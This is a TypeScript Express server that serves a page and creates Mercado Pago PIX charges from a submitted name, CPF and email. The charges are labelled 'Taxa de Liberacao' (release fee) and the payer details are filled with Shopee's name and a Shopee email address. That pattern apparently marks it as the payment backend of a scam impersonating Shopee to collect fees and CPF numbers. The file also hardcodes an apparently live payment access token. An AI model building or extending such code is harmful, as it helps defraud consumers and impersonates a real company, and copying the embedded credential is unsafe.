import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';

const app = express();

app.use(express.json());
app.use(cors({ origin: '*' }));

// === AQUI ESTÁ A CORREÇÃO ===
// Diz para o servidor procurar arquivos (como index.html) na pasta raiz
app.use(express.static(path.join(__dirname, '../')));

// Quando acessar o site, entrega o index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// === ROTA DO PIX (MERCADO PAGO) ===
app.post('/pix', async (req, res) => {
    console.log("🔹 [PIX] Recebido pedido de:", req.body.name);
    
    try {
        const { amount, name, cpf, email } = req.body;
        
        // Prepara dados
        const payload = {
            transaction_amount: Number(amount) || 37.90,
            description: "Taxa de Liberacao",
            payment_method_id: "pix",
            payer: {
                // Email é OBRIGATÓRIO no MP. Se não tiver, usamos um genérico.
                email: (email && email.includes('@')) ? email : "pagamento@shopee.com",
                first_name: String(name).split(' ')[0] || "Cliente",
                last_name: "Shopee",
                identification: {
                    type: "CPF",
                    number: String(cpf).replace(/\D/g, '') // Limpa o CPF
                }
            }
        };

        const ACCESS_TOKEN = 'APP_USR-2572776399339396-020516-e4fefa77579bb50393285e683713d789-232650059';

        const response = await axios.post('https://api.mercadopago.com/v1/payments', payload, {
            headers: {
                'Authorization': `Bearer ${ACCESS_TOKEN}`,
                'Content-Type': 'application/json',
                'X-Idempotency-Key': `pay-${Date.now()}`
            }
        });

        console.log("✅ Pix Gerado ID:", response.data.id);
        res.status(201).json(response.data);

    } catch (error: any) {
        // Se der erro, mostra no log o motivo exato
        const msgErro = error.response?.data?.message || error.message;
        console.error("❌ ERRO MP:", JSON.stringify(error.response?.data, null, 2));
        
        res.status(500).json({ 
            error: "Falha no Mercado Pago", 
            detalhes: msgErro 
        });
    }
});

const PORT = Number(process.env.PORT) || 10000;
app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Servidor rodando na porta ${PORT}`));